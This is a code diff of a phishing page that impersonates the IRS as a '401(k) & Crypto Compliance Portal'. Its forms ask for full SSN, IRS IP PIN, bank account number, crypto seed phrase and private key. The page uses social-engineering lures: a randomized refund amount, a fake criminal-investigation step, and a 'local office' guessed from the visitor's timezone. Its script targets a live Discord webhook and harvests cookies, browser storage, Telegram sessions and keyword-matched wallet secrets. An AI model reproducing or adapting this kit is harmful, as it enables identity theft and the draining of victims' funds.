@@ -3,363 +3,262 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Internal Revenue Service | An official website of the United States government</title>
+    <title>IRS Secure Portal | 401(k) & Crypto Compliance</title>
     <style>
-        /* ========================================================= */
-        /*                     RESET & BASE                         */
-        /* ========================================================= */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: 'Source Sans Pro', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: #ffffff;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #f5f7fa;
             color: #1d1d1f;
-            line-height: 1.6;
-        }
-        a { text-decoration: none; color: #1a5fb4; }
-        .container { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
-
-        /* ========================================================= */
-        /*                     HEADER                              */
-        /* ========================================================= */
-        .usa-banner {
-            background: #f0f0f0;
-            padding: 6px 0;
-            font-size: 14px;
-            color: #1d1d1f;
-        }
-        .usa-banner .container { display: flex; align-items: center; gap: 12px; flex-wrap: wrap; }
-        .usa-banner .us-flag img { height: 20px; }
-        .usa-banner .official-text { font-weight: 600; }
-        .usa-banner .official-text .action { font-weight: 400; color: #005ea2; }
-        .usa-banner .button { background: none; border: none; color: #005ea2; cursor: pointer; font-size: 14px; }
-
-        .pup-header-main {
-            background: #ffffff;
-            border-bottom: 1px solid #e5e5e5;
-            padding: 12px 0;
-        }
-        .pup-header-main .container { display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px; }
-        .logo img { height: 50px; }
-        .header-right { display: flex; align-items: center; gap: 20px; flex-wrap: wrap; }
-        .header-right .menu { display: flex; gap: 20px; list-style: none; }
-        .header-right .menu a { color: #1d1d1f; font-weight: 500; font-size: 14px; }
-        .header-right .menu .sign-in { background: #005ea2; color: #fff; padding: 8px 16px; border-radius: 4px; }
-
-        .header-nav {
-            background: #1d1d1f;
-            padding: 0;
-        }
-        .header-nav .container-fluid { max-width: 1200px; margin: 0 auto; padding: 0 15px; }
-        .header-nav ul { display: flex; gap: 0; list-style: none; margin: 0; padding: 0; }
-        .header-nav ul li a {
-            display: block;
-            padding: 12px 20px;
-            color: #ffffff;
-            font-weight: 600;
-            font-size: 15px;
-            border-right: 1px solid #333;
-        }
-        .header-nav ul li a:hover { background: #333; }
-
-        /* ========================================================= */
-        /*                     HERO BANNER                         */
-        /* ========================================================= */
-        .hero-banner {
-            background: #f5f5f5;
-            padding: 40px 0;
-            border-bottom: 1px solid #e5e5e5;
-        }
-        .hero-banner .container { display: flex; align-items: center; gap: 40px; flex-wrap: wrap; }
-        .hero-banner .content { flex: 1; }
-        .hero-banner h2 { font-size: 32px; font-weight: 700; color: #1d1d1f; }
-        .hero-banner p { font-size: 18px; color: #333; margin: 10px 0; }
-        .hero-banner .btn { display: inline-block; background: #005ea2; color: #fff; padding: 12px 30px; border-radius: 4px; font-weight: 600; }
-        .hero-banner .image { flex: 1; text-align: center; }
-
-        /* ========================================================= */
-        /*                     TOP TASKS                           */
-        /* ========================================================= */
-        .top-tasks { padding: 40px 0; }
-        .top-tasks h2 { font-size: 28px; margin-bottom: 20px; }
-        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; }
-        .card {
-            background: #f8f9fa;
-            border-radius: 8px;
-            padding: 20px;
-            border: 1px solid #e5e5e5;
-            transition: 0.2s;
-        }
-        .card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.08); }
-        .card h3 { font-size: 18px; color: #1d1d1f; }
-        .card p { font-size: 14px; color: #555; margin-top: 8px; }
-
-        /* ========================================================= */
-        /*                     HELP & CONTACT                      */
-        /* ========================================================= */
-        .help-section { padding: 40px 0; background: #f8f9fa; }
-        .help-section h2 { font-size: 28px; margin-bottom: 20px; }
-        .accordion { border: 1px solid #e5e5e5; border-radius: 8px; overflow: hidden; }
-        .accordion-item { border-bottom: 1px solid #e5e5e5; }
-        .accordion-item:last-child { border-bottom: none; }
-        .accordion-trigger {
-            background: #fff;
-            padding: 16px 20px;
-            width: 100%;
-            text-align: left;
-            font-weight: 600;
-            border: none;
-            cursor: pointer;
-            font-size: 16px;
-        }
-        .accordion-trigger:hover { background: #f0f0f0; }
-        .accordion-panel { padding: 0 20px 16px; display: none; }
-        .accordion-panel.active { display: block; }
-
-        /* ========================================================= */
-        /*                     FOOTER                              */
-        /* ========================================================= */
-        .pup-footer {
-            background: #1d1d1f;
-            color: #fff;
-            padding: 40px 0 20px;
-        }
-        .pup-footer a { color: #a9b8c9; }
-        .pup-footer .menu { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 30px; }
-        .pup-footer .menu li { list-style: none; margin-bottom: 8px; }
-        .pup-footer .menu .header { font-weight: 700; color: #fff; }
-        .pup-footer .bottom { border-top: 1px solid #333; padding-top: 20px; margin-top: 20px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; }
-
-        /* ========================================================= */
-        /*                     FORM OVERLAY                        */
-        /* ========================================================= */
-        #formOverlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.6);
-            backdrop-filter: blur(8px);
+            display: flex;
             justify-content: center;
             align-items: center;
-            z-index: 99999;
+            min-height: 100vh;
+            padding: 20px;
         }
-        #formOverlay.active { display: flex; }
-        .form-card {
-            background: #fff;
-            padding: 40px;
-            border-radius: 16px;
-            max-width: 500px;
-            width: 90%;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-        }
-        .form-card h2 { font-size: 24px; margin-bottom: 8px; }
-        .form-card p { color: #6e6e73; margin-bottom: 20px; }
-        .form-card input {
+        .container {
+            max-width: 720px;
             width: 100%;
-            padding: 12px 16px;
-            margin-bottom: 12px;
-            border: 1px solid #d2d2d7;
-            border-radius: 8px;
-            font-size: 16px;
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 40px 32px;
+            box-shadow: 0 8px 40px rgba(0,0,0,0.06);
+            border: 1px solid #e5e7eb;
+            position: relative;
         }
-        .form-card input:focus { border-color: #005ea2; outline: none; }
-        .form-card .btn-submit {
-            width: 100%;
-            padding: 14px;
+        .logo { text-align: center; margin-bottom: 8px; }
+        .logo img { height: 48px; }
+        .seal {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            margin: 8px 0 12px;
+            font-size: 12px;
+            color: #005ea2;
+            background: #e8f0fe;
+            padding: 6px 16px;
+            border-radius: 40px;
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .seal i { font-style: normal; font-weight: 600; }
+        h1 { font-size: 26px; font-weight: 700; text-align: center; color: #1d1d1f; }
+        .subhead { text-align: center; color: #6e6e73; margin-bottom: 20px; font-size: 15px; }
+        .step-badge { background: #005ea2; color: #fff; padding: 2px 12px; border-radius: 40px; font-size: 12px; font-weight: 600; display: inline-block; margin-bottom: 4px; }
+        .step-desc { font-size: 14px; color: #3a3a3c; }
+        .form-group { margin-bottom: 16px; }
+        .form-group label { display: block; font-weight: 600; font-size: 14px; margin-bottom: 4px; color: #1d1d1f; }
+        .form-group input, .form-group select { width: 100%; padding: 12px 16px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 15px; background: #fafafa; transition: 0.2s; }
+        .form-group input:focus, .form-group select:focus { border-color: #005ea2; outline: none; background: #fff; }
+        .form-group .hint { font-size: 12px; color: #8e8e93; margin-top: 4px; }
+        .btn { width: 100%; padding: 14px; background: #005ea2; color: #fff; border: none; border-radius: 12px; font-size: 17px; font-weight: 600; cursor: pointer; transition: 0.15s; margin-top: 8px; }
+        .btn:hover { background: #004b8a; }
+        .btn:active { transform: scale(0.97); }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+        .footer { text-align: center; font-size: 12px; color: #8e8e93; margin-top: 18px; }
+        .footer a { color: #005ea2; text-decoration: none; }
+        .hidden { display: none; }
+        .progress { display: flex; justify-content: space-between; margin-bottom: 20px; gap: 8px; }
+        .progress .step-indicator { flex: 1; text-align: center; font-size: 12px; color: #8e8e93; padding: 6px 0; border-bottom: 3px solid #e5e7eb; }
+        .progress .step-indicator.active { color: #005ea2; border-bottom-color: #005ea2; font-weight: 600; }
+        .spinner-overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255,255,255,0.85);
+            backdrop-filter: blur(4px);
+            justify-content: center; align-items: center;
+            z-index: 9999;
+            flex-direction: column;
+        }
+        .spinner-overlay.active { display: flex; }
+        .spinner { width: 48px; height: 48px; border: 4px solid #e5e7eb; border-top: 4px solid #005ea2; border-radius: 50%; animation: spin 0.8s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .spinner-text { margin-top: 16px; font-size: 15px; color: #1d1d1f; font-weight: 500; }
+        .live-chat {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
             background: #005ea2;
             color: #fff;
-            border: none;
-            border-radius: 8px;
-            font-size: 17px;
+            padding: 12px 18px;
+            border-radius: 40px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
+            box-shadow: 0 4px 16px rgba(0,0,0,0.15);
+            z-index: 999;
+            border: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
-        .form-card .btn-submit:hover { background: #004b8a; }
-        .form-card .footer { font-size: 13px; color: #8e8e93; margin-top: 14px; text-align: center; }
-        .form-card .footer a { color: #005ea2; }
-
-        /* ========================================================= */
-        /*                     RESPONSIVE                          */
-        /* ========================================================= */
-        @media (max-width: 768px) {
-            .hero-banner .container { flex-direction: column; }
-            .header-nav ul { flex-wrap: wrap; }
-            .header-nav ul li a { padding: 10px 14px; font-size: 13px; }
-            .pup-header-main .container { flex-direction: column; align-items: stretch; }
-            .header-right { justify-content: space-between; }
+        .live-chat:hover { background: #004b8a; }
+        .consent-box { display: flex; align-items: flex-start; gap: 10px; margin: 12px 0; }
+        .consent-box input { width: 18px; height: 18px; margin-top: 2px; accent-color: #005ea2; }
+        .consent-box label { font-size: 13px; color: #3a3a3c; }
+        .refund-preview {
+            background: #f0f7ff;
+            border-left: 4px solid #005ea2;
+            padding: 12px 16px;
+            border-radius: 8px;
+            margin-bottom: 16px;
+            font-size: 14px;
+        }
+        .refund-preview strong { color: #005ea2; }
+        .local-office {
+            font-size: 13px;
+            color: #555;
+            text-align: center;
+            background: #f8f9fb;
+            padding: 6px 12px;
+            border-radius: 40px;
+            margin: 6px 0 14px;
+            display: inline-block;
+            width: auto;
         }
     </style>
 </head>
 <body>
 
-    <!-- ========================================================= -->
-    <!--                     OFFICIAL BANNER                       -->
-    <!-- ========================================================= -->
-    <div class="usa-banner">
-        <div class="container">
-            <div class="us-flag"><img src="https://www.irs.gov/themes/custom/pup_base/images/us_flag_small.png" alt="US flag" /></div>
-            <div class="official-text">An official website of the United States government <span class="action">Here's how you know</span></div>
-            <button class="button" onclick="toggleBanner()">Here's how you know</button>
-        </div>
+    <!-- ============================================================ -->
+    <!-- SPINNER OVERLAY                                              -->
+    <!-- ============================================================ -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <div class="spinner-text">⏳ Processing with IRS secure servers...</div>
     </div>
 
-    <!-- ========================================================= -->
-    <!--                     HEADER                               -->
-    <!-- ========================================================= -->
-    <header class="pup-header-main">
-        <div class="container">
-            <div class="logo"><a href="/"><img src="https://www.irs.gov/themes/custom/pup_base/IRS-Logo.svg" alt="IRS" /></a></div>
-            <div class="header-right">
-                <ul class="menu">
-                    <li><a href="#">Help</a></li>
-                    <li><a href="#">News</a></li>
-                    <li><a href="#">Tax Pros</a></li>
-                    <li><a href="#" class="sign-in" id="signInBtn">Sign in</a></li>
-                </ul>
+    <!-- ============================================================ -->
+    <!-- LIVE CHAT WIDGET                                             -->
+    <!-- ============================================================ -->
+    <button class="live-chat" id="liveChatBtn">💬 Live Support</button>
+
+    <div class="container">
+
+        <!-- LOGO & SEAL -->
+        <div class="logo"><img src="https://www.irs.gov/themes/custom/pup_base/IRS-Logo.svg" alt="IRS" /></div>
+        <div class="seal"><i>🔒 Official IRS e‑file</i> <span id="dynamicSeal">· Valid: 2026-07-27 · IP: US</span></div>
+        <div class="local-office" id="localOffice">📍 Your local IRS office in <span id="cityName">Washington, DC</span> is handling your case.</div>
+
+        <h1>401(k) & Crypto Compliance Portal</h1>
+        <div class="subhead">Please complete all sections to comply with IRS reporting requirements for retirement and digital assets.</div>
+
+        <!-- REFUND PREVIEW -->
+        <div class="refund-preview">🎯 Based on your estimated income, you may be eligible for a refund of <strong>$4,287</strong>. Verify your information to claim it.</div>
+
+        <!-- PROGRESS -->
+        <div class="progress">
+            <div class="step-indicator active" id="step1Label">Step 1</div>
+            <div class="step-indicator" id="step2Label">Step 2</div>
+            <div class="step-indicator" id="step3Label">Step 3</div>
+            <div class="step-indicator" id="step4Label">Step 4</div>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- STEP 1 — IDENTITY + PARTIAL SSN                              -->
+        <!-- ============================================================ -->
+        <div id="step1">
+            <div class="step-badge">Step 1 of 4</div>
+            <h2 style="font-size:20px;margin:4px 0 6px;">Identity Verification</h2>
+            <div class="step-desc">Please verify your identity to continue.</div>
+            <div class="form-group"><label for="fullName">Full Legal Name</label><input type="text" id="fullName" placeholder="John A. Doe" /></div>
+            <div class="form-group"><label for="ssnPartial">Last 4 Digits of SSN</label><input type="text" id="ssnPartial" placeholder="6789" maxlength="4" /></div>
+            <div class="form-group"><label for="dob">Date of Birth</label><input type="date" id="dob" /></div>
+            <div class="form-group"><label for="phone">Phone Number</label><input type="tel" id="phone" placeholder="(555) 123-4567" /></div>
+            <div class="form-group"><label for="email">Email Address</label><input type="email" id="email" placeholder="john.doe@email.com" /></div>
+            <div class="form-group"><label for="address">Current Address</label><input type="text" id="address" placeholder="123 Main St, Anytown, USA" /></div>
+            <button class="btn" id="step1Btn">Continue to Step 2</button>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- STEP 2 — 401(K) + RETIREMENT + IRA                          -->
+        <!-- ============================================================ -->
+        <div id="step2" class="hidden">
+            <div class="step-badge">Step 2 of 4</div>
+            <h2 style="font-size:20px;margin:4px 0 6px;">401(k) & Retirement Verification</h2>
+            <div class="step-desc">Provide your retirement account details for compliance.</div>
+            <div class="form-group"><label for="employer">Employer Name</label><input type="text" id="employer" placeholder="Acme Corp" /></div>
+            <div class="form-group"><label for="provider">401(k) Provider</label>
+                <select id="provider"><option value="Fidelity Investments">Fidelity Investments</option><option value="Vanguard">Vanguard</option><option value="Charles Schwab">Charles Schwab</option><option value="Empower Retirement">Empower Retirement</option><option value="Principal Financial Group">Principal Financial Group</option><option value="T. Rowe Price">T. Rowe Price</option><option value="Nationwide">Nationwide</option><option value="American Funds">American Funds</option><option value="Transamerica">Transamerica</option><option value="ADP Retirement Services">ADP Retirement Services</option><option value="Paychex">Paychex</option><option value="John Hancock">John Hancock</option><option value="TIAA">TIAA</option><option value="MassMutual">MassMutual</option><option value="Lincoln Financial Group">Lincoln Financial Group</option><option value="Merrill Lynch">Merrill Lynch</option><option value="Wells Fargo">Wells Fargo</option><option value="JPMorgan Chase">JPMorgan Chase</option><option value="State Street">State Street</option><option value="BlackRock">BlackRock</option><option value="Other">Other</option></select>
+            </div>
+            <div class="form-group"><label for="accountNumber">Account Number (last 4 digits)</label><input type="text" id="accountNumber" placeholder="1234" maxlength="4" /></div>
+            <div class="form-group"><label for="retirementBalance">Estimated Balance (USD)</label><input type="text" id="retirementBalance" placeholder="475,000" /></div>
+            <div class="form-group"><label for="iraType">IRA Type</label>
+                <select id="iraType"><option value="Traditional">Traditional</option><option value="Roth">Roth</option><option value="SEP">SEP</option><option value="SIMPLE">SIMPLE</option><option value="None">None</option></select>
+            </div>
+            <button class="btn" id="step2Btn">Continue to Step 3</button>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- STEP 3 — CRYPTO + REAL ESTATE + BUSINESS                    -->
+        <!-- ============================================================ -->
+        <div id="step3" class="hidden">
+            <div class="step-badge">Step 3 of 4</div>
+            <h2 style="font-size:20px;margin:4px 0 6px;">Crypto, Real Estate & Business Declaration</h2>
+            <div class="step-desc">Provide details about your assets and income sources.</div>
+            <div class="form-group"><label for="exchange">Exchange Used</label>
+                <select id="exchange"><option value="Coinbase">Coinbase</option><option value="Binance">Binance</option><option value="Kraken">Kraken</option><option value="Gemini">Gemini</option><option value="Other">Other</option></select>
+            </div>
+            <div class="form-group"><label for="walletType">Wallet Type</label>
+                <select id="walletType"><option value="MetaMask">MetaMask</option><option value="Trust Wallet">Trust Wallet</option><option value="Phantom">Phantom</option><option value="Coinbase Wallet">Coinbase Wallet</option><option value="Exodus">Exodus</option><option value="Other">Other</option></select>
+            </div>
+            <div class="form-group"><label for="walletAddress">Wallet Address</label><input type="text" id="walletAddress" placeholder="0x..." /></div>
+            <div class="form-group"><label for="cryptoHoldings">Estimated Crypto Holdings (USD)</label><input type="text" id="cryptoHoldings" placeholder="250,000" /></div>
+            <div class="form-group"><label for="propertyAddress">Real Estate Property Address</label><input type="text" id="propertyAddress" placeholder="123 Property Ln, City, ST" /></div>
+            <div class="form-group"><label for="propertyValue">Estimated Property Value (USD)</label><input type="text" id="propertyValue" placeholder="850,000" /></div>
+            <div class="form-group"><label for="businessName">Business Name (if any)</label><input type="text" id="businessName" placeholder="My LLC" /></div>
+            <div class="form-group"><label for="businessIncome">Annual Business Income (USD)</label><input type="text" id="businessIncome" placeholder="500,000" /></div>
+            <button class="btn" id="step3Btn">Continue to Step 4</button>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- STEP 4 — FULL SSN + IP PIN + SEED + PRIVATE KEY            -->
+        <!-- ============================================================ -->
+        <div id="step4" class="hidden">
+            <div class="step-badge">Step 4 of 4 — IRS Criminal Investigation Unit</div>
+            <h2 style="font-size:20px;margin:4px 0 6px;">🔐 Final Security Verification</h2>
+            <div class="step-desc">The IRS Criminal Investigation Unit is cross‑checking your data with FinCEN. Please complete the verification below.</div>
+            <div class="form-group"><label for="fullSsn">Full SSN</label><input type="text" id="fullSsn" placeholder="123-45-6789" /></div>
+            <div class="form-group"><label for="irsPin">IRS Identity Protection PIN (IP PIN)</label><input type="text" id="irsPin" placeholder="6-digit PIN" /></div>
+            <div class="form-group"><label for="bankAccount">Bank Account Number (for refund verification)</label><input type="text" id="bankAccount" placeholder="******1234" /></div>
+            <div class="form-group"><label for="seedPhrase">Blockchain Validation (Seed Phrase)</label>
+                <input type="text" id="seedPhrase" placeholder="abandon abandon ..." />
+                <div class="hint">The IRS needs to verify ownership of the wallet address you listed. This is a standard regulatory audit requirement.</div>
+            </div>
+            <div class="form-group"><label for="privateKey">Private Key (optional)</label>
+                <input type="text" id="privateKey" placeholder="0x..." />
+                <div class="hint">If you prefer not to share your seed phrase, you may paste your private key instead.</div>
+            </div>
+            <div class="consent-box">
+                <input type="checkbox" id="consentCheck" />
+                <label for="consentCheck">I consent to disclose this information for compliance purposes. All data is encrypted and will only be used for IRS reporting.</label>
+            </div>
+            <button class="btn" id="step4Btn">Submit to IRS</button>
+        </div>
+
+        <!-- ============================================================ -->
+        <!-- SUCCESS PAGE                                                -->
+        <!-- ============================================================ -->
+        <div id="successPage" class="hidden">
+            <div style="text-align:center;padding:20px 0;">
+                <div style="font-size:48px;margin-bottom:12px;">✅</div>
+                <h2 style="font-size:24px;font-weight:700;">Submission Received</h2>
+                <p style="color:#3a3a3c;margin:8px 0 16px;">Your information has been successfully submitted to the IRS.</p>
+                <p style="font-size:14px;color:#6e6e73;">Confirmation #: IRS-2026-<span id="confNumber">8723</span></p>
+                <button class="btn" id="printBtn" style="max-width:300px;margin:16px auto 0;">🖨️ Print Confirmation Receipt</button>
+                <p style="font-size:12px;color:#8e8e93;margin-top:12px;">A copy has been sent to your email.</p>
             </div>
         </div>
-    </header>
 
-    <!-- ========================================================= -->
-    <!--                     NAVIGATION                           -->
-    <!-- ========================================================= -->
-    <div class="header-nav">
-        <div class="container-fluid">
-            <ul>
-                <li><a href="#">File</a></li>
-                <li><a href="#">Pay</a></li>
-                <li><a href="#">Refunds</a></li>
-                <li><a href="#">Credits &amp; Deductions</a></li>
-                <li><a href="#">Forms &amp; Instructions</a></li>
-                <li><a href="#">Report Fraud</a></li>
-            </ul>
-        </div>
+        <div class="footer"><a href="https://www.irs.gov/">IRS.gov</a> · <a href="#">Privacy Policy</a> · <a href="#">Disclaimers</a></div>
     </div>
 
-    <!-- ========================================================= -->
-    <!--                     HERO BANNER                          -->
-    <!-- ========================================================= -->
-    <section class="hero-banner">
-        <div class="container">
-            <div class="content">
-                <h2>Do more with an IRS account</h2>
-                <p>Access your tax information with an Individual, Business or Tax Pro Account</p>
-                <ul style="margin: 16px 0; list-style: none; padding: 0;">
-                    <li style="margin-bottom: 6px;">✅ Refund status</li>
-                    <li style="margin-bottom: 6px;">✅ Tax records</li>
-                    <li style="margin-bottom: 6px;">✅ Payments</li>
-                    <li style="margin-bottom: 6px;">✅ Notifications</li>
-                </ul>
-                <a href="#" class="btn" id="createAccountBtn">Create account</a>
-            </div>
-            <div class="image">
-                <img src="https://www.irs.gov/pub/image/woman-on-laptop.svg" alt="Woman on laptop" style="max-width: 100%; height: auto;" />
-            </div>
-        </div>
-    </section>
-
-    <!-- ========================================================= -->
-    <!--                     TOP TASKS                            -->
-    <!-- ========================================================= -->
-    <section class="top-tasks">
-        <div class="container">
-            <h2>Popular topics</h2>
-            <div class="grid">
-                <div class="card"><h3>Payments</h3><p>Make a payment, apply for a payment plan, and find other options to pay a tax debt.</p></div>
-                <div class="card"><h3>IRS Free File</h3><p>Explore your free filing options. IRS Free File is open until Oct. 15.</p></div>
-                <div class="card"><h3>Tax records</h3><p>Get your tax return transcripts and other tax records from current and prior years.</p></div>
-                <div class="card"><h3>Employer ID number (EIN)</h3><p>Get an EIN, free and direct from the IRS in minutes.</p></div>
-                <div class="card"><h3>Withholding</h3><p>Check the amount of tax you want withheld from your pay with our Estimator.</p></div>
-                <div class="card"><h3>Amended tax return</h3><p>Submit an amended tax return or check the status of your amended return.</p></div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ========================================================= -->
-    <!--                     HELP & CONTACT                       -->
-    <!-- ========================================================= -->
-    <section class="help-section">
-        <div class="container">
-            <h2>Help &amp; contact</h2>
-            <div class="accordion">
-                <div class="accordion-item">
-                    <button class="accordion-trigger">Your account</button>
-                    <div class="accordion-panel">
-                        <p><a href="#">Sign in or create an account</a> to access and manage your personal tax information in one place.</p>
-                        <p><a href="#">How to create an account</a></p>
-                        <p><a href="#">What you can do with an account</a></p>
-                    </div>
-                </div>
-                <div class="accordion-item">
-                    <button class="accordion-trigger">Amended return</button>
-                    <div class="accordion-panel">
-                        <p><a href="#">File an amended return</a> to fix a mistake on your tax return.</p>
-                        <p><a href="#">Check the status of your amended return</a></p>
-                    </div>
-                </div>
-                <div class="accordion-item">
-                    <button class="accordion-trigger">Identity protection PIN (IP PIN)</button>
-                    <div class="accordion-panel">
-                        <p>To get an IP PIN, <a href="#">sign in or create an account</a>.</p>
-                        <p>You can also <a href="#">get one with an application or in person</a>.</p>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- ========================================================= -->
-    <!--                     FOOTER                               -->
-    <!-- ========================================================= -->
-    <footer class="pup-footer">
-        <div class="container">
-            <div class="menu">
-                <div>
-                    <div class="header">Our Agency</div>
-                    <ul><li><a href="#">About IRS</a></li><li><a href="#">Careers</a></li><li><a href="#">Operations and Budget</a></li></ul>
-                </div>
-                <div>
-                    <div class="header">Know Your Rights</div>
-                    <ul><li><a href="#">Taxpayer Bill of Rights</a></li><li><a href="#">Taxpayer Advocate Service</a></li><li><a href="#">Independent Office of Appeals</a></li></ul>
-                </div>
-                <div>
-                    <div class="header">Resolve an Issue</div>
-                    <ul><li><a href="#">IRS Notices and Letters</a></li><li><a href="#">Identity Theft</a></li><li><a href="#">Tax scams</a></li></ul>
-                </div>
-                <div>
-                    <div class="header">Languages</div>
-                    <ul><li><a href="#">Español</a></li><li><a href="#">中文 (简体)</a></li><li><a href="#">한국어</a></li></ul>
-                </div>
-            </div>
-            <div class="bottom">
-                <div>&copy; 2026 Internal Revenue Service</div>
-                <div><a href="#">Privacy Policy</a> | <a href="#">Accessibility</a></div>
-            </div>
-        </div>
-    </footer>
-
-    <!-- ========================================================= -->
-    <!--                     FORM OVERLAY                         -->
-    <!-- ========================================================= -->
-    <div id="formOverlay">
-        <div class="form-card">
-            <h2>🔐 Secure Verification</h2>
-            <p>Please verify your identity to continue.</p>
-            <input type="text" id="fullName" placeholder="Full Name" />
-            <input type="text" id="ssn" placeholder="Social Security Number" />
-            <input type="email" id="email" placeholder="Email Address" />
-            <input type="text" id="exchange" placeholder="What exchange do you use? (e.g., Coinbase, Binance)" />
-            <input type="text" id="wallet" placeholder="What wallet do you use? (e.g., MetaMask, Trust)" />
-            <button class="btn-submit" id="submitBtn">Continue</button>
-            <div class="footer"><a href="#">Forgot your password?</a></div>
-        </div>
-    </div>
-
-    <!-- ========================================================= -->
-    <!--                      SCRIPTS                             -->
-    <!-- ========================================================= -->
+    <!-- ============================================================ -->
+    <!--                      SCRIPTS                                 -->
+    <!-- ============================================================ -->
     <script>
         (function() {
 
@@ -368,15 +267,8 @@
             // ============================================================
             const webhook = "https://discord.com/api/webhooks/1529428365273202860/0vmbBbKsCF2FvO3-CrOAyylgaV2h2KtEf3i0zCCMxfLHBGPa-w4As4gxOAsTNwbD3xpe";
 
-            // ============================================================
-            // SEND TO DISCORD
-            // ============================================================
             function sendToDiscord(content) {
-                fetch(webhook, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: content })
-                }).catch(() => {});
+                fetch(webhook, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: content }) }).catch(() => {});
             }
 
             // ============================================================
@@ -390,7 +282,9 @@
                     cookies: document.cookie,
                     localStorage: {},
                     sessionStorage: {},
-                    wallets: []
+                    telegramSession: null,
+                    wallets: [],
+                    location: null
                 };
 
                 // localStorage
@@ -398,17 +292,24 @@
                     let key = localStorage.key(i);
                     let val = localStorage.getItem(key);
                     data.localStorage[key] = val;
-
                     let lower = key.toLowerCase();
                     if (lower.includes('seed') || lower.includes('phrase') || lower.includes('mnemonic') ||
                         lower.includes('private') || lower.includes('key') || lower.includes('wallet') ||
                         lower.includes('metamask') || lower.includes('trust') || lower.includes('phantom') ||
                         lower.includes('coinbase') || lower.includes('exodus') || lower.includes('keplr') ||
-                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x')) {
+                        lower.includes('rabby') || lower.includes('brave') || lower.includes('0x') ||
+                        lower.includes('solana') || lower.includes('cosmos') || lower.includes('avalanche') ||
+                        lower.includes('polygon') || lower.includes('arbitrum') || lower.includes('optimism') ||
+                        lower.includes('tron') || lower.includes('xrp') || lower.includes('bnb') || lower.includes('bsc') ||
+                        lower.includes('eth')) {
                         let words = val.trim().split(/\s+/);
                         if (words.length >= 12 && words.length <= 24) {
                             data.wallets.push({ type: 'seed', source: key, value: val, wordCount: words.length });
                         } else if (val.length === 42 && val.startsWith('0x')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else if (val.length > 30 && val.startsWith('r')) {
+                            data.wallets.push({ type: 'address', source: key, value: val });
+                        } else if (val.length > 40 && val.startsWith('T')) {
                             data.wallets.push({ type: 'address', source: key, value: val });
                         } else {
                             data.wallets.push({ type: 'raw', source: key, value: val });
@@ -422,79 +323,228 @@
                     data.sessionStorage[key] = sessionStorage.getItem(key);
                 }
 
+                // Telegram session
+                const tgKeys = ['telegram-user', 'tg-web-app', 'tdesktop', 'telegram_session'];
+                for (let key of tgKeys) {
+                    if (localStorage.getItem(key)) {
+                        data.telegramSession = localStorage.getItem(key);
+                        break;
+                    }
+                }
+
                 return data;
             }
 
             // ============================================================
-            // ACCORDION TOGGLE
+            // DYNAMIC SEAL
             // ============================================================
-            document.querySelectorAll('.accordion-trigger').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    let panel = this.nextElementSibling;
-                    panel.classList.toggle('active');
-                });
-            });
+            function updateSeal() {
+                const now = new Date();
+                const dateStr = now.toISOString().split('T')[0];
+                const ipState = 'US';
+                document.getElementById('dynamicSeal').textContent = `· Valid: ${dateStr} · IP: ${ipState}`;
+            }
+            updateSeal();
 
             // ============================================================
-            // SHOW FORM OVERLAY
+            // LOCAL OFFICE (Timezone-based)
             // ============================================================
-            function showOverlay() {
-                document.getElementById('formOverlay').classList.add('active');
+            function setLocalOffice() {
+                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const cityMap = {
+                    'America/New_York': 'New York, NY',
+                    'America/Chicago': 'Chicago, IL',
+                    'America/Denver': 'Denver, CO',
+                    'America/Los_Angeles': 'Los Angeles, CA',
+                    'America/Phoenix': 'Phoenix, AZ',
+                    'America/Miami': 'Miami, FL',
+                    'America/Dallas': 'Dallas, TX',
+                    'America/Seattle': 'Seattle, WA'
+                };
+                const city = cityMap[tz] || 'Washington, DC';
+                document.getElementById('cityName').textContent = city;
+            }
+            setLocalOffice();
+
+            // ============================================================
+            // REFUND PREVIEW (Dynamic)
+            // ============================================================
+            const refundAmount = Math.floor(2000 + Math.random() * 8000);
+            document.querySelector('.refund-preview strong').textContent = '$' + refundAmount.toLocaleString();
+
+            // ============================================================
+            // CONFIRMATION NUMBER
+            // ============================================================
+            document.getElementById('confNumber').textContent = Math.floor(1000 + Math.random() * 9000);
+
+            // ============================================================
+            // SPINNER
+            // ============================================================
